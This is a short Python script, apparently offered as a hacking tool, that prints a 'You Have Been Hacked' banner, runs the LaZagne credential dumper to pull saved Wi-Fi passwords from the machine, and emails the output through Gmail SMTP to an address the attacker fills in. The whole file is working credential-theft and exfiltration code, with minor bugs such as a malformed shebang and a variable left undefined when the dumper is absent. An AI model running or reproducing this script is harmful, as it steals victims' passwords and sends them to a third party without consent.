#!/bin/bash/python

import subprocess
import smtplib
import os

os.system("cls")

var = """                                                                                            

 _       ____    _ __          __  __      __ 
| |     / / /_  (_) /____     / / / /___ _/ /_
| | /| / / __ \/ / __/ _ \   / /_/ / __ `/ __/
| |/ |/ / / / / / /_/  __/  / __  / /_/ / /_  
|__/|__/_/ /_/_/\__/\___/  /_/ /_/\__,_/\__/  
                                              

"""
print("\t\t\33[92m" + var)
print("\t[-] You Have Been Hacked [-]")
print("\t[+] https://github.com/hackerrishad")
print("\t[+] your password is hacked. pls wait.........")

def send_email(email, password, massage):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, massage)
    server.quit()

if os .path.exists('lazagne.exe'):
    result = subprocess.check_output("lazagne wifi", shell=True)
else:
    print("lazagne.exe file not found")

send_email("Your Gmail", "Your Password", result)

print("="*50)
print("\t\t\tEND")
print("="*50)